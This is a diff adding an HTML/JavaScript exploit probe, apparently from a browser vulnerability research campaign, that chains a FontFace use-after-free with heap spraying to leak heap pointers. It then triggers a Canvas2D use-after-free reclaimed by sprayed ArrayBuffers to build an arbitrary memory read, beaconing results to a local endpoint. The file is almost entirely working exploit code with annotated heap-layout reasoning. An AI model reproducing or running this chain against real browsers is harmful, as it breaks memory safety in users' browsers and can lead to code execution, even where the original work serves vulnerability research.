@@ -1,0 +1,286 @@
+<!--
+  p681: Canvas2D UAF with AB(768) reclaim → arbitrary read at leaked FontFace address
+  NOTE: upstream master ships phase23_info_leak/p682_fontface_canvas_arbread.html,
+  the merged FontFace leak + Canvas UAF read. This local probe predates it and
+  is kept as the campaign record.
+  
+  KEY CLAIM TO TEST: p636 showed IsoHeap OFF for Canvas2D — AB(768) reclaimed.
+  If true: we write leaked pointers into the AB at the m_stateStack offset,
+  then read through staleCtx.getTransform() → reads from target address.
+  
+  Chain:
+    Phase A: FontFace UAF → AB(192) reclaim → leak +0x58 (T) and +0x68 (impl)
+    Phase B: Canvas2D UAF → AB(768) spray (NOT Canvas2D spray)
+             If AB reclaims: staleCtx reads from our controlled bytes
+    Phase C: Find m_stateStack offset by writing markers and reading through stale
+    Phase D: Write T at the m_stateStack.m_buffer offset → read memory at T
+  
+  m_stateStack layout (Vector<State>):
+    m_buffer: pointer to State array
+    m_capacity: size_t
+    m_size: size_t
+  Total Vector header: 24 bytes (3 × 8)
+  
+  We need to find the offset of m_stateStack within the 768B Canvas2D object.
+  Strategy: fill AB with a recognizable per-offset pattern, then read lineWidth
+  through stale. The lineWidth offset within State tells us which bytes of our
+  AB are being read as m_stateStack → State → lineWidth.
+  
+  CRASH_CLASS: HIGH (reading through forged pointers)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p681</title></head>
+<body>p681: AB(768) reclaim + arbread
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P681-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+function hex8(v){return('0'+v.toString(16)).slice(-2);}
+function hexqword(arr,off){var s='';for(var i=7;i>=0;i--)s+=hex8(arr[off+i]);return s;}
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+var alive=[];
+
+// ================================================================
+// PHASE A: FontFace heap leak (same as p680)
+// ================================================================
+emit('A','fontface-leak');
+var leaked={raw58:'',raw68:''};
+try{
+  var style=document.createElement('style');
+  style.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042}";
+  document.head.appendChild(style);
+  var ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;alive.push(ff);
+  var firedA=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedA)return undefined;firedA=true;
+      style.remove();try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      window.__fm=[];
+      for(var k=0;k<16;k++){
+        var ab=new ArrayBuffer(192);
+        window.__fm.push({ab:ab,view:new Uint8Array(ab)});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f0, s0','AB');
+}catch(e){emit('A-ERR',e.message);}
+
+setTimeout(function(){
+  var map=window.__fm||[],bestI=-1,bestN=0;
+  for(var i=0;i<map.length;i++){
+    var v=map[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>bestN){bestN=n;bestI=i;}
+  }
+  if(bestI>=0){
+    var v=map[bestI].view;
+    leaked.raw58=hexqword(v,0x58);
+    leaked.raw68=hexqword(v,0x68);
+    emit('A-LEAK','T=0x'+leaked.raw58+' impl=0x'+leaked.raw68);
+  } else {
+    emit('A-CLEAN','no fontface reclaim');
+  }
+  flush();
+  doPhaseB();
+},150);
+
+// ================================================================
+// PHASE B: Canvas2D UAF → AB(768) spray
+// ================================================================
+function doPhaseB(){
+  emit('B','canvas-uaf-ab768');
+  var staleCtx=null;
+  try{
+    var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+    document.body.appendChild(oc);
+    var triggered=false,innerCtx=null;
+    var opts={};
+    Object.defineProperty(opts,'alpha',{get:function(){
+      if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+      return true;
+    }});
+    oc.getContext('bitmaprenderer',opts);
+    staleCtx=innerCtx;
+    emit('B-UAF','triggered='+triggered);
+  }catch(e){emit('B-UAF-ERR',e.message);flush();return;}
+
+  // Spray AB(768) — NOT Canvas2D
+  // Each AB filled with a unique per-buffer marker at every 8-byte slot
+  var abSpray=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    // Leave ZEROED — null m_stateStack.m_buffer should be handled gracefully
+    // or at least tell us if the crash is from the pointer dereference
+    abSpray.push({ab:ab,u8:new Uint8Array(ab)});
+    alive.push(ab);
+  }
+  emit('B-SPRAY','50 AB(768) zeroed');flush();
+
+  // Try reading through stale
+  try{
+    var lw=staleCtx.lineWidth;
+    emit('B-LW','lineWidth='+lw+' hex='+d2hex(lw));
+
+    // Check if lw matches our marker pattern
+    if(lw>=1000000&&lw<1500000){
+      var bufIdx=Math.floor((lw-1000000)/1000);
+      var qwIdx=Math.round((lw-1000000-bufIdx*1000));
+      emit('B-AB-HIT','*** AB RECLAIMED! buf='+bufIdx+' qwOff='+qwIdx+' ***');
+      emit('B-AB-HIT','lineWidth reads from AB offset '+(qwIdx*8)+' bytes');
+      
+      // This tells us: m_stateStack.last().lineWidth is at this offset
+      // in the reclaimed AB(768). Now we know the layout!
+      
+      doPhaseC(staleCtx,abSpray,bufIdx);
+      return;
+    }
+
+    // Check if it's a default lineWidth (1.0) from a Canvas2D that reclaimed
+    if(lw===1){
+      emit('B-CTX-RECLAIM','Canvas2D default reclaimed (IsoHeap same-type)');
+      // IsoHeap might be on — try differently
+    }
+
+    // Check if lw is 0 (zeroed AB reclaimed but offset doesn't map to lineWidth)
+    if(lw===0){
+      emit('B-ZERO','lineWidth=0 — AB may have reclaimed but offset unclear');
+    }
+
+    // Try getTransform
+    var t=staleCtx.getTransform();
+    emit('B-TRANSFORM','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    emit('B-T-HEX','a='+d2hex(t.a)+' e='+d2hex(t.e));
+
+    // Check if any transform value matches our markers
+    var tvals=[t.a,t.b,t.c,t.d,t.e,t.f];
+    for(var v=0;v<tvals.length;v++){
+      if(tvals[v]>=1000000&&tvals[v]<1500000){
+        var bi=Math.floor((tvals[v]-1000000)/1000);
+        var qi=Math.round((tvals[v]-1000000-bi*1000));
+        emit('B-T-HIT','transform['+v+'] → AB buf='+bi+' qwOff='+qi);
+      }
+    }
+
+    // Also try globalAlpha, shadowBlur etc
+    var ga=staleCtx.globalAlpha;
+    emit('B-GA','globalAlpha='+ga+' hex='+d2hex(ga));
+    if(ga>=1000000&&ga<1500000){
+      emit('B-GA-HIT','globalAlpha → AB marker!');
+    }
+
+  }catch(e){emit('B-READ-ERR',e.name+':'+e.message);}
+  flush();
+
+  // If we got here without a hit, try a second approach:
+  // Maybe the process crashed because the zeroed AB doesn't have valid pointers
+  // for m_stateStack.m_buffer. Try filling the AB with a valid pointer pattern.
+  emit('B-RETRY','trying with leaked pointer as m_stateStack content');
+  
+  // If we have leaked addresses, try a second Canvas2D UAF
+  // with AB(768) filled differently
+  if(leaked.raw58!==''){
+    doPhaseB2(leaked);
+  } else {
+    emit('B-NOLEAK','no leaked address to use');
+    doSummary();
+  }
+}
+
+// Phase B2: second attempt with leaked pointer in the AB
+function doPhaseB2(leaked){
+  emit('B2','second-canvas-uaf-with-pointers');
+  var staleCtx2=null;
+  try{
+    var oc2=document.createElement('canvas');oc2.width=4;oc2.height=4;
+    document.body.appendChild(oc2);
+    var triggered2=false,innerCtx2=null;
+    var opts2={};
+    Object.defineProperty(opts2,'alpha',{get:function(){
+      if(!triggered2){triggered2=true;innerCtx2=oc2.getContext('2d');}
+      return true;
+    }});
+    oc2.getContext('bitmaprenderer',opts2);
+    staleCtx2=innerCtx2;
+  }catch(e){emit('B2-ERR',e.message);flush();doSummary();return;}
+
+  // Parse leaked T into bytes
+  var tBytes=[];
+  for(var i=0;i<8;i++){
+    tBytes.push(parseInt(leaked.raw58.slice((7-i)*2,(7-i)*2+2),16));
+  }
+  
+  // Spray AB(768) with the leaked T as a valid pointer at EVERY 8-byte slot
+  // This way, wherever m_stateStack.m_buffer lands, it points to T
+  var abSpray2=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    for(var j=0;j<768;j+=8){
+      for(var b=0;b<8;b++) u8[j+b]=tBytes[b];
+    }
+    // Also set size fields (m_capacity=1, m_size=1) at likely Vector offsets
+    // Vector<State> header: {m_buffer(8), m_capacity(8), m_size(8)}
+    // We want m_capacity≥1 and m_size≥1 so .last() returns buffer[0]
+    // Set every other qword to 1 (alternating pointer/size pattern)
+    // Actually just set T everywhere — if m_size reads as a pointer value,
+    // it's huge but .last() = buffer[m_size-1] which would be OOB...
+    // Safer: use the marker pattern from B1 but with T at key offsets
+    // For now, just try the raw approach
+    abSpray2.push({ab:ab,u8:u8});
+    alive.push(ab);
+  }
+  emit('B2-SPRAY','50 AB(768) with T at all offsets');flush();
+
+  try{
+    var lw2=staleCtx2.lineWidth;
+    emit('B2-LW','lineWidth='+lw2+' hex='+d2hex(lw2));
+    
+    // If we survived and got a non-zero lineWidth, the AB reclaimed
+    // and we're reading through our forged pointers!
+    if(lw2!==0&&lw2!==1){
+      emit('B2-RESULT','NON-DEFAULT lineWidth — possible AB reclaim!');
+      
+      var t=staleCtx2.getTransform();
+      emit('B2-TRANSFORM','a='+d2hex(t.a)+' b='+d2hex(t.b)+' c='+d2hex(t.c));
+      emit('B2-TRANSFORM2','d='+d2hex(t.d)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+    }
+  }catch(e){emit('B2-READ-ERR',e.name+':'+e.message);}
+  flush();
+  doSummary();
+}
+
+function doPhaseC(staleCtx,abSpray,bufIdx){
+  emit('C','layout-discovery');
+  // We know which AB reclaimed and at which qword offset lineWidth is read
+  // Now map more offsets
+  try{
+    var t=staleCtx.getTransform();
+    emit('C-TRANSFORM','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    var ga=staleCtx.globalAlpha;
+    emit('C-GA','globalAlpha='+ga);
+  }catch(e){emit('C-ERR',e.message);}
+  flush();
+  doSummary();
+}
+
+function doSummary(){
+  emit('SUMMARY','---');
+  emit('S-T',leaked.raw58||'none');
+  emit('S-impl',leaked.raw68||'none');
+  emit('DONE','p681-complete');flush();
+}
+
+})();
+</script>
+</body>
+</html>
